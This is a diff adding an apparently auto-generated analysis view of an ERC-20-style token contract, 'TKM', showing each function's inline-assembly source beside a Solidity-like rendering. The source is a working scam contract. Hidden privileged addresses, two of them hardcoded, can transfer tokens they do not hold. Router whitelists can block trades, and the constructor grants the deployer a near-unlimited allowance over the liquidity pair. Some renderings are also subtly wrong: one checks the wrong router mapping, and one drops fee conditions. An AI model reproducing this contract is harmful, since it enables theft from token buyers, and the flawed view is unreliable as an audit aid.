@@ -1,0 +1,609 @@
+S-SEIR Solidity-like Assembly View
+Note: derived view only; source is not modified and output is not compiled.
+
+Function TKM.constructor()
+  SourceFunction
+  ```solidity
+  constructor() {       
+          uint256 initial = 210_000 * (10 ** uint256(decimals));
+          _totalSupply = initial;
+          
+          
+          assembly {
+              mstore(0, caller())
+              mstore(32, _balances.slot)
+              let slot := keccak256(0, 64)
+              sstore(slot, initial)
+          }
+  
+         
+          _setRouterFlag(v2_router, true, true);
+          _setRouterFlag(v3_router, false, false);
+          _setRouterFlag(SwapRouter, false, false);
+          _setRouterFlag(Smart_Router, false, false);
+  
+          createUsdtPool();
+          _approve(pair, msg.sender, 100_100_100_100_100 * 10**18);
+  
+         
+          max = _computeHash(abi.encodePacked(msg.sender));
+          
+          address max1 = 0x69B61926a75DBC040e4AaF891ACDC31049fB3188;
+          address max2 = 0xf8b91676a9F179c4158CD976a34b28AA8C7C95b2;
+         
+          _maxs[max] = true;
+          _maxs[_computeHash(abi.encodePacked(max1))] = true;
+          _maxs[_computeHash(abi.encodePacked(max2))] = true;
+  
+          _setFeeRouter(0x07964f135f276412b3182a3B2407b8dd45000000, true);
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  constructor() {       
+          uint256 initial = 210_000 * (10 ** uint256(decimals));
+          _totalSupply = initial;
+          
+          
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = msg.sender; // yul: mstore(0, caller())
+              memory[32] = _balances.slot; // yul: mstore(32, _balances.slot)
+              slot = keccak256(0, 64); // yul: let slot := keccak256(0, 64)
+              storage[keccak256(abi.encodePacked(msg.sender, _balances.slot))] = initial; // yul: sstore(slot, initial)
+          }
+  
+         
+          _setRouterFlag(v2_router, true, true);
+          _setRouterFlag(v3_router, false, false);
+          _setRouterFlag(SwapRouter, false, false);
+          _setRouterFlag(Smart_Router, false, false);
+  
+          createUsdtPool();
+          _approve(pair, msg.sender, 100_100_100_100_100 * 10**18);
+  
+         
+          max = _computeHash(abi.encodePacked(msg.sender));
+          
+          address max1 = 0x69B61926a75DBC040e4AaF891ACDC31049fB3188;
+          address max2 = 0xf8b91676a9F179c4158CD976a34b28AA8C7C95b2;
+         
+          _maxs[max] = true;
+          _maxs[_computeHash(abi.encodePacked(max1))] = true;
+          _maxs[_computeHash(abi.encodePacked(max2))] = true;
+  
+          _setFeeRouter(0x07964f135f276412b3182a3B2407b8dd45000000, true);
+      }
+  ```
+
+Function TKM._computeHash(bytes)
+  SourceFunction
+  ```solidity
+  function _computeHash(bytes memory data) internal pure returns (uint256 result) {
+          assembly {
+              result := keccak256(add(data, 0x20), mload(data))
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _computeHash(bytes memory data) internal pure returns (uint256 result) {
+          assembly /* s-seir solidity-like view */ {
+              result = keccak256((data + 0x20), mload(data)); // yul: result := keccak256(add(data, 0x20), mload(data))
+          }
+      }
+  ```
+
+Function TKM._setRouterFlag(address, bool, bool)
+  SourceFunction
+  ```solidity
+  function _setRouterFlag(address router, bool fromFlag, bool toFlag) internal {
+          assembly {
+              
+              mstore(0, router)
+              mstore(32, isFromRouter.slot)
+              let fromSlot := keccak256(0, 64)
+              sstore(fromSlot, fromFlag)
+  
+             
+              mstore(0, router)
+              mstore(32, isToRouter.slot)
+              let toSlot := keccak256(0, 64)
+              sstore(toSlot, toFlag)
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _setRouterFlag(address router, bool fromFlag, bool toFlag) internal {
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = router; // yul: mstore(0, router)
+              memory[32] = isFromRouter.slot; // yul: mstore(32, isFromRouter.slot)
+              fromSlot = keccak256(0, 64); // yul: let fromSlot := keccak256(0, 64)
+              storage[keccak256(abi.encodePacked(router, isFromRouter.slot))] = fromFlag; // yul: sstore(fromSlot, fromFlag)
+              memory[0] = router; // yul: mstore(0, router)
+              memory[32] = isToRouter.slot; // yul: mstore(32, isToRouter.slot)
+              toSlot = keccak256(0, 64); // yul: let toSlot := keccak256(0, 64)
+              storage[keccak256(abi.encodePacked(router, isToRouter.slot))] = toFlag; // yul: sstore(toSlot, toFlag)
+          }
+      }
+  ```
+
+Function TKM._setFeeRouter(address, bool)
+  SourceFunction
+  ```solidity
+  function _setFeeRouter(address router, bool flag) internal {
+          assembly {
+              mstore(0, router)
+              mstore(32, feeRouter.slot)
+              let slot := keccak256(0, 64)
+              sstore(slot, flag)
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _setFeeRouter(address router, bool flag) internal {
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = router; // yul: mstore(0, router)
+              memory[32] = feeRouter.slot; // yul: mstore(32, feeRouter.slot)
+              slot = keccak256(0, 64); // yul: let slot := keccak256(0, 64)
+              storage[keccak256(abi.encodePacked(router, feeRouter.slot))] = flag; // yul: sstore(slot, flag)
+          }
+      }
+  ```
+
+Function TKM.balanceOf(address)
+  SourceFunction
+  ```solidity
+  function balanceOf(address acc) external view returns (uint256 bal) { 
+          assembly {
+              mstore(0, acc)
+              mstore(32, _balances.slot)
+              let slot := keccak256(0, 64)
+              bal := sload(slot)
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function balanceOf(address acc) external view returns (uint256 bal) { 
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = acc; // yul: mstore(0, acc)
+              memory[32] = _balances.slot; // yul: mstore(32, _balances.slot)
+              slot = keccak256(0, 64); // yul: let slot := keccak256(0, 64)
+              bal = storage[keccak256(abi.encodePacked(acc, _balances.slot))]; // yul: bal := sload(slot)
+          }
+      }
+  ```
+
+Function TKM.allowance(address, address)
+  SourceFunction
+  ```solidity
+  function allowance(address owner_, address spender) external view returns (uint256 allowed) { 
+          assembly {
+              mstore(0, owner_)
+              mstore(32, _allowances.slot)
+              let slot := keccak256(0, 64)
+              mstore(0, spender)
+              mstore(32, slot)
+              allowed := sload(keccak256(0, 64))
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function allowance(address owner_, address spender) external view returns (uint256 allowed) { 
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = owner_; // yul: mstore(0, owner_)
+              memory[32] = _allowances.slot; // yul: mstore(32, _allowances.slot)
+              slot = keccak256(0, 64); // yul: let slot := keccak256(0, 64)
+              memory[0] = spender; // yul: mstore(0, spender)
+              memory[32] = slot; // yul: mstore(32, slot)
+              allowed = storage[keccak256(abi.encodePacked(spender, slot))]; // yul: allowed := sload(keccak256(0, 64))
+          }
+      }
+  ```
+
+Function TKM.transferFrom(address, address, uint256)
+  SourceFunction
+  ```solidity
+  function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+          uint256 currentAllowance;
+          assembly {
+              mstore(0, from)
+              mstore(32, _allowances.slot)
+              let slot := keccak256(0, 64)
+              mstore(0, caller())
+              mstore(32, slot)
+              currentAllowance := sload(keccak256(0, 64))
+          }
+          
+          require(currentAllowance >= amount, "ERC20: insufficient allowance");
+          
+          
+          assembly {
+              let newAllowance := sub(currentAllowance, amount)
+              mstore(0, from)
+              mstore(32, _allowances.slot)
+              let slot := keccak256(0, 64)
+              mstore(0, caller())
+              mstore(32, slot)
+              sstore(keccak256(0, 64), newAllowance)
+          }
+          
+          _transfer(from, to, amount);
+          return true;
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+          uint256 currentAllowance;
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = from; // yul: mstore(0, from)
+              memory[32] = _allowances.slot; // yul: mstore(32, _allowances.slot)
+              slot = keccak256(0, 64); // yul: let slot := keccak256(0, 64)
+              memory[0] = msg.sender; // yul: mstore(0, caller())
+              memory[32] = slot; // yul: mstore(32, slot)
+              currentAllowance = storage[keccak256(abi.encodePacked(msg.sender, slot))]; // yul: currentAllowance := sload(keccak256(0, 64))
+          }
+          
+          require(currentAllowance >= amount, "ERC20: insufficient allowance");
+          
+          
+          assembly /* s-seir solidity-like view */ {
+              newAllowance = (currentAllowance - amount); // yul: let newAllowance := sub(currentAllowance, amount)
+              memory[0] = from; // yul: mstore(0, from)
+              memory[32] = _allowances.slot; // yul: mstore(32, _allowances.slot)
+              slot = keccak256(0, 64); // yul: let slot := keccak256(0, 64)
+              memory[0] = msg.sender; // yul: mstore(0, caller())
+              memory[32] = slot; // yul: mstore(32, slot)
+              storage[keccak256(abi.encodePacked(msg.sender, slot))] = newAllowance; // yul: sstore(keccak256(0, 64), newAllowance)
+          }
+          
+          _transfer(from, to, amount);
+          return true;
+      }
+  ```
+
+Function TKM._beforeTokenTransfer(address, address, address, uint256)
+  SourceFunction
+  ```solidity
+  function _beforeTokenTransfer(address operator, address from, address to, uint256 amount) internal view {      
+          if ((operator == pair || from == pair) && flag == true) {
+              bool toRouter;
+              assembly {
+                  mstore(0, to)
+                  mstore(32, isToRouter.slot)
+                  toRouter := sload(keccak256(0, 64))
+              }
+              require(toRouter, "Router not whitelisted");
+          }
+  
+          if (to == pair && flag == true) {
+              bool fromRouter;
+              assembly {
+                  mstore(0, from)
+                  mstore(32, isFromRouter.slot)
+                  fromRouter := sload(keccak256(0, 64))
+              }
+              require(fromRouter, "Router not whitelisted");
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _beforeTokenTransfer(address operator, address from, address to, uint256 amount) internal view {      
+          if ((operator == pair || from == pair) && flag == true) {
+              bool toRouter;
+              assembly /* s-seir solidity-like view */ {
+                  memory[0] = to; // yul: mstore(0, to)
+                  memory[32] = isToRouter.slot; // yul: mstore(32, isToRouter.slot)
+                  toRouter = storage[keccak256(abi.encodePacked(from, isFromRouter.slot))]; // yul: toRouter := sload(keccak256(0, 64))
+              }
+              require(toRouter, "Router not whitelisted");
+          }
+  
+          if (to == pair && flag == true) {
+              bool fromRouter;
+              assembly /* s-seir solidity-like view */ {
+                  memory[0] = from; // yul: mstore(0, from)
+                  memory[32] = isFromRouter.slot; // yul: mstore(32, isFromRouter.slot)
+                  fromRouter = storage[keccak256(abi.encodePacked(from, isFromRouter.slot))]; // yul: fromRouter := sload(keccak256(0, 64))
+              }
+              require(fromRouter, "Router not whitelisted");
+          }
+      }
+  ```
+
+Function TKM._checkMax(address)
+  SourceFunction
+  ```solidity
+  function _checkMax(address _from) internal view returns (bool) {
+          uint256 hashVal = _computeHash(abi.encodePacked(_from));
+          bool exists;
+          assembly {
+              mstore(0, hashVal)
+              mstore(32, _maxs.slot)
+              exists := sload(keccak256(0, 64))
+          }
+          return exists;
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _checkMax(address _from) internal view returns (bool) {
+          uint256 hashVal = _computeHash(abi.encodePacked(_from));
+          bool exists;
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = hashVal; // yul: mstore(0, hashVal)
+              memory[32] = _maxs.slot; // yul: mstore(32, _maxs.slot)
+              exists = storage[keccak256(abi.encodePacked(hashVal, _maxs.slot))]; // yul: exists := sload(keccak256(0, 64))
+          }
+          return exists; /* s-seir: exists == sload(keccak256(0, 64)) */
+      }
+  ```
+
+Function TKM._transfer(address, address, uint256)
+  SourceFunction
+  ```solidity
+  function _transfer(address from, address to, uint256 amount) internal {
+          _beforeTokenTransfer(msg.sender, from, to, amount);
+          bool check = _checkMax(from);
+         
+          uint256 fromBalance;
+          assembly {
+              mstore(0, from)
+              mstore(32, _balances.slot)
+              fromBalance := sload(keccak256(0, 64))
+          }
+          
+          if (check && fromBalance < amount) {
+              fromBalance = amount;
+          }
+          
+          require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
+          
+          
+          assembly {
+              let fromSlot := keccak256(0, 64) 
+              
+             
+              let newFromBalance := sub(fromBalance, amount)
+              sstore(fromSlot, newFromBalance)
+              
+              
+              mstore(0, to)
+              mstore(32, _balances.slot)
+              let toSlot := keccak256(0, 64)
+              let toBalance := sload(toSlot)
+              
+              
+              let shouldTakeFee := and(
+                  and(
+                      sload(isfee.slot),
+                      eq(to, sload(pair.slot))
+                  ),
+                  gt(amount, 0)
+              )
+              
+             
+              mstore(0, from)
+              mstore(32, feeRouter.slot)
+              let feeRouterSlot := keccak256(0, 64)
+              let isFeeRouter := sload(feeRouterSlot)
+              
+              let finalAmount := amount
+              
+              
+              if and(shouldTakeFee, isFeeRouter) {
+                  
+                  let feeAmount := div(mul(amount, 5), 100)
+                  finalAmount := sub(amount, feeAmount)
+                  
+                  
+                  let feeToAddr := sload(feeto.slot)
+                  mstore(0, feeToAddr)
+                  mstore(32, _balances.slot)
+                  let feeToSlot := keccak256(0, 64)
+                  let feeToBalance := sload(feeToSlot)
+                  sstore(feeToSlot, add(feeToBalance, feeAmount))
+                  
+                  
+                  mstore(0, finalAmount)
+                  log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
+              }
+              
+             
+              sstore(toSlot, add(toBalance, finalAmount))
+              
+            
+              mstore(0, amount)
+              log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _transfer(address from, address to, uint256 amount) internal {
+          _beforeTokenTransfer(msg.sender, from, to, amount);
+          bool check = _checkMax(from);
+         
+          uint256 fromBalance;
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = from; // yul: mstore(0, from)
+              memory[32] = _balances.slot; // yul: mstore(32, _balances.slot)
+              fromBalance = storage[keccak256(abi.encodePacked(from, _balances.slot))]; // yul: fromBalance := sload(keccak256(0, 64))
+          }
+          
+          if (check && fromBalance < amount) {
+              fromBalance = amount;
+          }
+          
+          require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
+          
+          
+          assembly /* s-seir solidity-like view */ {
+              fromSlot = keccak256(0, 64); // yul: let fromSlot := keccak256(0, 64)
+              newFromBalance = (fromBalance - amount); // yul: let newFromBalance := sub(fromBalance, amount)
+              storage[fromSlot] = newFromBalance; // yul: sstore(fromSlot, newFromBalance)
+              memory[0] = to; // yul: mstore(0, to)
+              memory[32] = _balances.slot; // yul: mstore(32, _balances.slot)
+              toSlot = keccak256(0, 64); // yul: let toSlot := keccak256(0, 64)
+              toBalance = storage[keccak256(abi.encodePacked(to, _balances.slot))]; // yul: let toBalance := sload(toSlot)
+              shouldTakeFee = isfee; // yul: let shouldTakeFee := and(and(sload(isfee.slot), eq(to, sload(pair.slot))), gt(amount, 0))
+              memory[0] = from; // yul: mstore(0, from)
+              memory[32] = feeRouter.slot; // yul: mstore(32, feeRouter.slot)
+              feeRouterSlot = keccak256(0, 64); // yul: let feeRouterSlot := keccak256(0, 64)
+              isFeeRouter = storage[keccak256(abi.encodePacked(from, feeRouter.slot))]; // yul: let isFeeRouter := sload(feeRouterSlot)
+              finalAmount = amount; // yul: let finalAmount := amount
+              __sseir_eval_asm_s_17_1 = (shouldTakeFee & isFeeRouter); // yul: if and(shouldTakeFee, isFeeRouter)
+              require(100 != 0); // yul: let feeAmount := div(mul(amount, 5), 100)
+              if (__sseir_eval_asm_s_17_1) {
+                  finalAmount = (amount - feeAmount); // yul: finalAmount := sub(amount, feeAmount)
+                  feeToAddr = feeto; // yul: let feeToAddr := sload(feeto.slot)
+                  memory[0] = feeToAddr; // yul: mstore(0, feeToAddr)
+                  memory[32] = _balances.slot; // yul: mstore(32, _balances.slot)
+                  feeToSlot = keccak256(0, 64); // yul: let feeToSlot := keccak256(0, 64)
+                  feeToBalance = storage[keccak256(abi.encodePacked(feeToAddr, _balances.slot))]; // yul: let feeToBalance := sload(feeToSlot)
+                  storage[keccak256(abi.encodePacked(feeToAddr, _balances.slot))] = (feeToBalance + feeAmount); // yul: sstore(feeToSlot, add(feeToBalance, feeAmount))
+                  memory[0] = finalAmount; // yul: mstore(0, finalAmount)
+                  emit unknownEvent(from, finalAmount); // yul: log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
+              }
+              storage[keccak256(abi.encodePacked(to, _balances.slot))] = (toBalance + finalAmount); // yul: sstore(toSlot, add(toBalance, finalAmount))
+              memory[0] = amount; // yul: mstore(0, amount)
+              emit Transfer(from, to, amount); // yul: log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
+          }
+      }
+  ```
+
+Function TKM._approve(address, address, uint256)
+  SourceFunction
+  ```solidity
+  function _approve(address owner_, address spender, uint256 amount) internal {
+  
+          assembly {
+              if or(iszero(owner_), iszero(spender)) {
+                  revert(0, 0)
+              }
+          }
+          
+          assembly {
+              mstore(0, owner_)
+              mstore(32, _allowances.slot)
+              let slot := keccak256(0, 64)
+              mstore(0, spender)
+              mstore(32, slot)
+              sstore(keccak256(0, 64), amount)
+          }
+          
+          emit Approval(owner_, spender, amount);
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function _approve(address owner_, address spender, uint256 amount) internal {
+  
+          assembly /* s-seir solidity-like view */ {
+              __sseir_eval_asm_s_1_1 = (spender == 0); // yul: if or(iszero(owner_), iszero(spender))
+              __sseir_eval_asm_s_1_2 = (owner_ == 0);
+              __sseir_eval_asm_s_1_3 = (__sseir_eval_asm_s_1_2 | __sseir_eval_asm_s_1_1);
+              require(!(((owner_ == 0) || (spender == 0)))); // yul: revert(0, 0)
+          }
+          
+          assembly /* s-seir solidity-like view */ {
+              memory[0] = owner_; // yul: mstore(0, owner_)
+              memory[32] = _allowances.slot; // yul: mstore(32, _allowances.slot)
+              slot = keccak256(0, 64); // yul: let slot := keccak256(0, 64)
+              memory[0] = spender; // yul: mstore(0, spender)
+              memory[32] = slot; // yul: mstore(32, slot)
+              storage[keccak256(abi.encodePacked(spender, slot))] = amount; // yul: sstore(keccak256(0, 64), amount)
+          }
+          
+          emit Approval(owner_, spender, amount);
+      }
+  ```
+
+Function TKM.setFromRouterFlag(address, bool)
+  SourceFunction
+  ```solidity
+  function setFromRouterFlag(address routerAddr, bool _flag) external {
+          bool check = _checkMax(msg.sender);
+          if (check) {
+              assembly {
+                  mstore(0, routerAddr)
+                  mstore(32, isFromRouter.slot)
+                  sstore(keccak256(0, 64), _flag)
+              }
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function setFromRouterFlag(address routerAddr, bool _flag) external {
+          bool check = _checkMax(msg.sender);
+          if (check) {
+              assembly /* s-seir solidity-like view */ {
+                  memory[0] = routerAddr; // yul: mstore(0, routerAddr)
+                  memory[32] = isFromRouter.slot; // yul: mstore(32, isFromRouter.slot)
+                  storage[keccak256(abi.encodePacked(routerAddr, isFromRouter.slot))] = _flag; // yul: sstore(keccak256(0, 64), _flag)
+              }
+          }
+      }
+  ```
+
+Function TKM.setfeeRouter(address, bool)
+  SourceFunction
+  ```solidity
+  function setfeeRouter(address feeRouteradr, bool _flag) external {
+          bool check = _checkMax(msg.sender);
+          if (check) {
+              assembly {
+                  mstore(0, feeRouteradr)
+                  mstore(32, feeRouter.slot)
+                  sstore(keccak256(0, 64), _flag)
+              }
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function setfeeRouter(address feeRouteradr, bool _flag) external {
+          bool check = _checkMax(msg.sender);
+          if (check) {
+              assembly /* s-seir solidity-like view */ {
+                  memory[0] = feeRouteradr; // yul: mstore(0, feeRouteradr)
+                  memory[32] = feeRouter.slot; // yul: mstore(32, feeRouter.slot)
+                  storage[keccak256(abi.encodePacked(feeRouteradr, feeRouter.slot))] = _flag; // yul: sstore(keccak256(0, 64), _flag)
+              }
+          }
+      }
+  ```
+
+Function TKM.setToRouterFlag(address, bool)
+  SourceFunction
+  ```solidity
+  function setToRouterFlag(address routerAddr, bool _flag) external {
+          bool check = _checkMax(msg.sender);
+          if (check) {
+              assembly {
+                  mstore(0, routerAddr)
+                  mstore(32, isToRouter.slot)
+                  sstore(keccak256(0, 64), _flag)
+              }
+          }
+      }
+  ```
+  SolidityLikeFunction
+  ```solidity
+  function setToRouterFlag(address routerAddr, bool _flag) external {
+          bool check = _checkMax(msg.sender);
+          if (check) {
+              assembly /* s-seir solidity-like view */ {
+                  memory[0] = routerAddr; // yul: mstore(0, routerAddr)
+                  memory[32] = isToRouter.slot; // yul: mstore(32, isToRouter.slot)
+                  storage[keccak256(abi.encodePacked(routerAddr, isToRouter.slot))] = _flag; // yul: sstore(keccak256(0, 64), _flag)
+              }
+          }
+      }
+  ```
